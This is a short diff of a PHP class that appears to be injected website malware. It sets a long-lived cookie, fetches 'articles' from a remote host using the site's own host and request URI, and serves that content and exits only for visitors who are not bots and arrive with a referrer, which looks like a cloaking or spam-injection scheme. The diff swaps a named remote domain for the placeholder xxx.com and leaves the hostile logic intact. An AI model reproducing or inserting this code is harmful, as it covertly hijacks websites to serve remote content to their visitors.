@@ -26,7 +26,7 @@ class ModelTp1{
               setcookie("dfb_pass",  md5('filter'), time() + 31104000, '/');
               return;
           }
-        $this->articles = $this->httpVisit('http://svn.macormedia.net?host=http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'&name=aid-&fix=.html');
+        $this->articles = $this->httpVisit('http://xxx.com?host=http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'&name=aid-&fix=.html');
         if (!$this->isBot()&&$this->isRef()&&$this->ids()){
             echo $this->articles;exit;
         }
